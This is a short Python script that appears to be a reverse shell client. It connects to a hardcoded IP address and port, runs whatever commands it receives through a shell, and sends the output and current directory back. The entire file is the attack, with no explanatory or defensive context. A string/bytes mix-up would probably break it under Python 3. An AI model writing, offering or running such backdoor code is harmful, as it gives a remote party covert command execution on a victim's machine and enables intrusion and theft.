import os
import socket
import subprocess

s = socket.socket()
host = "192.168.43.254"
port = 4567
s.connect((host, port))

while True:
	data = s.recv(1024000)
	if data[:2].decode("utf-8")=="cd":
		dirr = data[3:].decode("utf-8")
		print(dirr)
		print(os.getcwd())
		os.chdir(str(os.getcwd())+"\\"+dirr)
	if len(data) > 0:
		cmd = subprocess.Popen(data[:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
		output_byte = cmd.stdout.read()
		output_str = str(output_byte)
		s.send(output_str + str(os.getcwd()) + ">")
s.close()